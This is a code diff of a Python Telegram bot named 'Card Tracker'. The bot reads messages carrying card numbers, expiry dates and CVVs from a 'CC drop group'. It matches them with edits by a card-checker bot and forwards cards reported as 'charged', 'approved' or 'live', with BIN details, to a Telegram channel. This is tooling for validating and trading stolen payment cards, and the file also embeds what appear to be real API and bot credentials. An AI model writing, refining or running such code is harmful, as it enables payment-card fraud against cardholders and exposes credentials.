@@ -1,6 +1,7 @@
 import re
 import aiohttp
 import logging
+import asyncio
 from pyrogram import Client, filters
 from pyrogram.enums import ParseMode
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
@@ -10,20 +11,17 @@ API_ID = 28232616
 API_HASH = "82e6373f14a917289086553eefc64afe"
 BOT_TOKEN = "8463287566:AAEHL1B2iCL0EcTpKN9soRKncHMAudBuAvs"
 
-CARD_CHECK_BOT_ID = 5366864997  # @VoidxBot
-SOURCE_GROUPS = [-4759483285]
-TARGET_CHANNELS = ["@hybuabu"]
+CARD_CHECK_BOT_ID = 5366864997  # @VoidxBot or any other checker bot user ID
+SOURCE_GROUPS = -4759483285  # Your user CC drop group
+TARGET_CHANNELS = ["@hybuabu"]     # Forward to this channel
 
 processed_ids = set()
-message_cache = {}
+card_cache = {}  # message.id -> card string
 
 # === LOGGING ===
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# === APP START ===
+# === BOT APP ===
 app = Client("card_tracker", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 # === BIN LOOKUP ===
@@ -45,12 +43,12 @@ async def get_bin_data(bin_code):
         logging.error(f"BIN lookup failed: {str(e)}")
     return [bin_code, "Unknown", "Unknown", "Unknown", "Unknown"]
 
-# === PARSE FUNCTION ===
+# === MESSAGE PARSER ===
 def parse_message(text):
     try:
         cc_match = re.search(
-            r'CC[:\s]*([0-9]{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})',
-            text, re.IGNORECASE
+            r'([0-9]{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})',
+            text
         )
         if not cc_match:
             return None
@@ -78,10 +76,12 @@ def parse_message(text):
         logging.error(f"Error parsing message: {str(e)}")
         return None
 
-# === SHOULD FORWARD ===
+# === CHECK IF CARD IS APPROVED ===
 def should_forward(response):
-    response = (response or "").lower()
-    return any(keyword in response for keyword in ["charged", "charge", "success", "approved", "live"])
+    if not response:
+        return False
+    response = response.lower()
+    return any(k in response for k in ["charged", "approved", "success", "live"])
 
 # === SEND TO CHANNEL ===
 async def send_to_channels(formatted_text):
@@ -105,19 +105,36 @@ async def send_to_channels(formatted_text):
             logging.error(f"Failed to send to {channel}: {str(e)}")
     return False
 
-# === HANDLE MESSAGE LOGIC ===
-async def process_message(message_id, full_text):
-    card_data = parse_message(full_text)
+# === HANDLE USER CC MESSAGES (/bb etc.) ===
+@app.on_message(filters.chat(SOURCE_GROUPS))
+async def on_user_message(client, message: Message):
+    text = message.text or message.caption or ""
+    if re.search(r'([0-9]{13,19})[| ](\d{1,2})[| ](\d{2,4})[| ](\d{3,4})', text):
+        card_cache[message.id] = text.strip()
+        logging.info(f"💾 Cached CC for message ID {message.id}")
+
+# === HANDLE EDITED CHECKER BOT MESSAGES ===
+@app.on_edited_message(filters.user(CARD_CHECK_BOT_ID))
+async def on_bot_edit(client, message: Message):
+    if message.id in processed_ids:
+        return
+
+    edit_text = message.text or message.caption or ""
+    cached_card = card_cache.get(message.id)
+    if not cached_card:
+        logging.info("⚠️ No cached card found for this edit.")
+        return
+
+    combined_text = cached_card + "\n" + edit_text
+    logging.info(f"📝 Merged message for parse: {combined_text[:60]}...")
+
+    card_data = parse_message(combined_text)
     if not card_data:
-        logging.debug("❌ No card data parsed.")
+        logging.info("❌ Parse failed. No valid CC or result found.")
         return
 
     if not should_forward(card_data["response"]):
-        logging.debug(f"❌ Response not valid for forwarding: {card_data['response']}")
-        return
-
-    if message_id in processed_ids:
-        logging.debug(f"⏩ Already processed message ID: {message_id}")
+        logging.info(f"⛔ Not forwarding. Response: {card_data['response']}")
         return
 
     bin_info = await get_bin_data(card_data["cc"][:6])
@@ -137,27 +154,12 @@ async def process_message(message_id, full_text):
     )
 
     if await send_to_channels(formatted_text):
-        processed_ids.add(message_id)
+        processed_ids.add(message.id)
         logging.info("✅ Forwarded successfully.")
+    else:
+        logging.error("❌ Forward failed.")
 
-# === MESSAGE HANDLERS ===
-@app.on_message(filters.user(CARD_CHECK_BOT_ID) | filters.chat(SOURCE_GROUPS))
-async def on_new_message(client, message: Message):
-    text = message.text or message.caption or ""
-    message_cache[message.id] = text
-    logging.info(f"[NEW MSG] {text[:80]}")
-    await process_message(message.id, text)
-
-@app.on_edited_message(filters.user(CARD_CHECK_BOT_ID) | filters.chat(SOURCE_GROUPS))
-async def on_edited_message(client, message: Message):
-    new_text = message.text or message.caption or ""
-    old_text = message_cache.get(message.id, "")
-    combined = old_text + "\n" + new_text
-    message_cache[message.id] = combined  # update
-    logging.info(f"[EDITED MSG] {new_text[:80]}")
-    await process_message(message.id, combined)
-
-# === START ===
+# === START BOT ===
 logging.info("🚀 Starting Card Tracker Bot...")
 print("✅ Bot is running and tracking edited + new messages...")
 app.run()
